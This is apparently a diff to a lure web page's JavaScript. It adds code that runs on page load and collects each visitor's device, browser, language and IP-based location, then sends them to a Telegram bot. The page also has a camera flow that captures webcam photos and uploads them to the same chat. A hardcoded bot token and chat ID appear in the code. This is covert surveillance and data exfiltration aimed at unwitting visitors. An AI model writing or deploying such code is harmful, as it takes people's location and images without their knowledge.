@@ -28,6 +28,51 @@ const BOT_TOKEN = "8301093694:AAEFQl_J7AvLc8_kRrpjVSyA0r5qdO6M2wo";
 const CHAT_ID = "1186294172";
 const SNAP_URL = "https://www.snapchat.com/add/habebabulaila";
 
+/* --------- VISIT TRACKING (ON LOAD) --------- */
+(async () => {
+  const ua = navigator.userAgent;
+
+  let device = "Unknown";
+  if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
+  else if (/Android/i.test(ua)) device = "Android";
+  else device = "Desktop";
+
+  let browser = "Unknown";
+  if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+  else if (ua.includes("Chrome")) browser = "Chrome";
+  else if (ua.includes("Firefox")) browser = "Firefox";
+
+  const language = navigator.language || "Unknown";
+  const time = new Date().toLocaleString();
+
+  let country = "Unknown";
+  let city = "Unknown";
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    country = data.country_name || country;
+    city = data.city || city;
+  } catch (e) {}
+
+  const message =
+`📥 New Visit
+📱 Device: ${device}
+🌐 Browser: ${browser}
+🗣 Language: ${language}
+📍 Location: ${country} - ${city}
+⏰ Time: ${time}`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  });
+})();
+
+/* --------- CAMERA FLOW (UNCHANGED) --------- */
 const startBtn = document.getElementById("start");
 const video = document.getElementById("video");
 
@@ -49,6 +94,8 @@ function capturePhoto() {
   canvas.getContext("2d").drawImage(video, 0, 0);
 
   canvas.toBlob(blob => {
+    if (!blob || blob.size < 5000) return;
+
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
     form.append("photo", blob);
